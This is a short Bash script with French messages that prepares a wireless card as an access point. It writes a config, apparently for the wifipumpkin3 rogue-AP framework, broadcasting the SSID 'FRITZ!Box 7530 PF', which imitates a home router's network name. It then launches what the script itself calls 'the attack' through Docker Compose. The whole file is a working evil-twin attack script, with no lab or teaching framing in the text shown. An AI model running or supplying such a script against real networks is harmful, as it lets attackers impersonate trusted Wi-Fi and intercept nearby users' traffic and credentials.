#!/bin/bash
MGMT_IP="192.168.178.65"
CURRENT_SSH_IP=$(echo $SSH_CONNECTION | awk '{print $3}')
[ -z "$CURRENT_SSH_IP" ] && CURRENT_SSH_IP=$(ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ "$CURRENT_SSH_IP" != "$MGMT_IP" ]; then
    echo "[!!!] ERREUR : Session SSH détectée hors wlan0 ($MGMT_IP) !"
    exit 1
fi

echo "[*] Préparation de wlan1 (Mode AP)..."
sudo nmcli device set wlan1 managed no 2>/dev/null
sudo ip link set wlan1 down
sudo ip addr flush dev wlan1
sudo ip link set wlan1 up

cat <<PULP > attack.pulp
set interface wlan1
set ssid "FRITZ!Box 7530 PF"
set proxy noproxy
start
PULP

echo "[+] Lancement du build final et de l'attaque..."
docker compose up -d --build
